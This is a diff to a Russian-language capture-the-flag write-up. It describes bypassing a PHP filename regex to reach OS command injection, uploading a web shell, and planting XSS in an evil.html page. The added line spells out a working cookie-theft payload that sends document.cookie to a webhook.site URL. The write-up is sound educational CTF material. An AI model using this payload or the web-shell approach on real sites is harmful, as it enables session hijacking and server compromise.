@@ -21,7 +21,7 @@ if (preg_match('/^[a-zA-Z0-9_]{0,30}+$/m', $filename) !== 1) {
 }
 ```
 3. Видим CRLF инъекцию в регулярное выражение и обходим его для выполнения os injection.
-4. Заливаем веб шелл и с помощью него в файл ```evil.html``` записываем ```XSS``` нагрузку для получения ```cookie``` 
+4. Заливаем веб шелл и с помощью него в файл ```evil.html``` записываем ```XSS``` нагрузку ```<img src onerror="window.location.replace('https://webhook.site/<webhook>?a='+document.cookie)">``` для получения ```cookie```. 
 5. Отправляем боту ссылку ```http://bigsmokepages.vkactf.ru/evil.html``` и ловим на веб хук флаг, находящийся у него в куках.
 
 
